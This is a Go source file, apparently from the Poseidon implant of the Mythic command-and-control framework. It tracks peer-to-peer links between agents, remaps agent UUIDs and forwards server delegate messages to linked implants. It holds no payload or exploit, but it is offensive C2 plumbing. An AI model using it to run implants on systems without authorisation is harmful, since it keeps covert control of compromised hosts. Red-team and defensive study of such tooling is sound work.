package p2p

import (
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

var (
	uuidMappings                    = make(map[string]string)
	availableP2P                    = make(map[string]structs.P2PProcessor)
	RemoveInternalConnectionChannel = make(chan structs.RemoveInternalConnectionMessage, 5)
	AddInternalConnectionChannel    = make(chan structs.AddInternalConnectionMessage, 5)
)

// registerAvailableP2P marks a new internal P2P tracker as available
func registerAvailableP2P(newP2PProcessor structs.P2PProcessor) {
	availableP2P[newP2PProcessor.ProfileName()] = newP2PProcessor
}

// GetInternalP2PMap returns a printable map of P2P connections for each P2P C2 profile
func GetInternalP2PMap() string {
	output := ""
	for p2pType, _ := range availableP2P {
		output += availableP2P[p2pType].ProfileName() + ":\n"
		output += availableP2P[p2pType].GetInternalP2PMap() + "\n"
	}
	return output
}

// getInternalConnectionUUID converts a random UUID into a proper MythicUUID for delegate messages via P2P
func getInternalConnectionUUID(oldUUID string) string {
	if newUUID, ok := uuidMappings[oldUUID]; ok {
		return newUUID
	}
	return oldUUID
}

// addInternalConnectionUUID adds a key/value pair to the internal uuidMappings
func addInternalConnectionUUID(key string, value string) {
	uuidMappings[key] = value
}

// HandleDelegateMessageForInternalP2PConnections forwards delegate messages to the right TCP connections
// A delegate message is coming in from some egress section and we need to forward it to the right connected agent
func HandleDelegateMessageForInternalP2PConnections(delegates []structs.DelegateMessage) {
	for i := 0; i < len(delegates); i++ {
		//fmt.Printf("HTTP's HandleInternalDelegateMessages going to linked node: %v\n", delegates[i])
		// check to see if this message goes to something we know about

		if _, ok := availableP2P[delegates[i].C2ProfileName]; ok {
			// Mythic told us that our UUID is wrong and there's a different one to use
			if delegates[i].MythicUUID != "" && delegates[i].MythicUUID != delegates[i].UUID {
				addInternalConnectionUUID(delegates[i].UUID, delegates[i].MythicUUID)
			}
			availableP2P[delegates[i].C2ProfileName].ProcessIngressMessageForP2P(&delegates[i])
		}

	}
}

// listenForRemoveInternalP2PConnections listens for P2P disconnect (RemoveInternalConnectionChannel) messages, removes internal tracking, and sends edge messages
func listenForRemoveInternalP2PConnections() {
	for {
		select {
		case removeConnection := <-RemoveInternalConnectionChannel:
			successfullyRemovedConnection := false
			removalMessage := structs.P2PConnectionMessage{
				Action:        "remove",
				C2ProfileName: removeConnection.C2ProfileName,
				Destination:   removeConnection.ConnectionUUID,
				Source:        profiles.GetMythicID(),
			}
			if _, ok := availableP2P[removeConnection.C2ProfileName]; ok {
				successfullyRemovedConnection = availableP2P[removeConnection.C2ProfileName].RemoveInternalConnection(removeConnection.ConnectionUUID)
			}
			if successfullyRemovedConnection {
				responses.P2PConnectionMessageChannel <- removalMessage
			}
		}
	}
}

// listenForAddInternalP2PConnections handles tracking P2P connections when a task reports a new connection (from a non P2P profile, ex link_tcp)
func listenForAddInternalP2PConnections() {
	for {
		addConnection := <-AddInternalConnectionChannel
		if _, ok := availableP2P[addConnection.C2ProfileName]; ok {
			availableP2P[addConnection.C2ProfileName].AddInternalConnection(addConnection.Connection)
		}
	}
}
